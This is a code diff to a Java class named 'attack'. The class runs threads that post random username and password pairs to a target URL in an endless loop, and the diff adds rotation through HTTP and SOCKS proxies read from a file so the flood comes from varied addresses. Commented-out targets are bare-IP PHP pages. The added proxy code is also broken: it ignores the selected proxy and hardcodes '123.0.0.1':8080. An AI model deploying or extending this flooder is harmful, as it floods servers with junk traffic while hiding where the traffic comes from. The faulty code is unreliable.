@@ -4,6 +4,8 @@
 import java.io.IOException;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
+import java.net.InetSocketAddress;
+import java.net.Proxy;
 import java.net.URL;
 
 import java.util.Random;
@@ -13,9 +15,24 @@ public class attack implements Runnable {
     static String url;
     static String param;
     static boolean genoutput = true;
+    static boolean proxyswitch = false;
+    static String[] proxyhttp;
+    static String[] proxysocks;
+    static boolean proxyhttpswich = false;
+    static boolean proxysocksswich = false;
 
-    protected static void feature(boolean tgenoutput) {
+    protected static void feature(boolean tgenoutput, boolean tproxyswitch, String tproxyfile) {
         genoutput = tgenoutput;
+        if (tproxyswitch) {
+            proxyhttp = proxy.readhttp(tproxyfile);
+            if (proxyhttp != null) {
+                proxyhttpswich = true;
+            }
+            proxysocks = proxy.readsocks(tproxyfile);
+            if (proxysocks != null) {
+                proxysocksswich = true;
+            }
+        }
     }
 
     protected static void start(int thnum, String tmethod, String turl, String tparam) {
@@ -47,6 +64,36 @@ public class attack implements Runnable {
         // "http://119.91.151.236/2018.php",
         // "http://124.223.76.146/index.php",
         // };
+        // proxy
+        String proxytype = "";
+        String proxyurl = "";
+        String proxyhost = "";
+        int proxyport = 0;
+        if (proxyhttpswich && proxysocksswich) {
+            if (random.nextBoolean()) {
+                proxytype = "http";
+                proxyurl = proxyhttp[random.nextInt(proxyhttp.length)];
+                proxyhost = proxy.host(proxyurl);
+                proxyport = proxy.port(proxyurl);
+            } else {
+                proxytype = "socks";
+                proxyurl = proxysocks[random.nextInt(proxysocks.length)];
+                proxyhost = proxy.host(proxyurl);
+                proxyport = proxy.port(proxyurl);
+            }
+        } else if (proxyhttpswich && !proxysocksswich) {
+            proxytype = "http";
+            proxyurl = proxyhttp[random.nextInt(proxyhttp.length)];
+            proxyhost = proxy.host(proxyurl);
+            proxyport = proxy.port(proxyurl);
+        } else if (!proxyhttpswich && proxysocksswich) {
+            proxytype = "socks";
+            proxyurl = proxysocks[random.nextInt(proxysocks.length)];
+            proxyhost = proxy.host(proxyurl);
+            proxyport = proxy.port(proxyurl);
+        } else {
+            System.out.println("ERROR: 没有找到可使用的代理");
+        }
         while (true) {
             // url
             // String url = urls[random.nextInt(urls.length)];
@@ -73,18 +120,29 @@ public class attack implements Runnable {
                 int randomInt = random.nextInt(str.length());
                 pass.append(str.charAt(randomInt));
             }
+            // 输出
             if (genoutput) {
                 System.out.println(rn.toString() + " " + pass.toString());
             }
-            go(rn.toString(), pass.toString(), url);
+            go(rn.toString(), pass.toString(), url, proxytype, proxyhost, proxyport);
         }
     }
 
-    private static void go(String name, String pass, String surl) {
+    private static void go(String name, String pass, String surl, String proxytype, String proxyurl, int proxyport) {
         HttpURLConnection httpURLConnection = null;
         try {
             URL url = new URL(surl);
-            httpURLConnection = (HttpURLConnection) url.openConnection();
+            if (proxytype == "" && proxyurl == "") {
+                httpURLConnection = (HttpURLConnection) url.openConnection();
+            } else {
+                if (proxytype == "http") {
+                    Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("123.0.0.1", 8080));
+                    httpURLConnection = (HttpURLConnection) url.openConnection(proxy);
+                } else if (proxytype == "socks") {
+                    Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("123.0.0.1", 8080));
+                    httpURLConnection = (HttpURLConnection) url.openConnection(proxy);
+                }
+            }
             httpURLConnection.setRequestMethod(method);
             // 超时时间
             httpURLConnection.setConnectTimeout(3000);
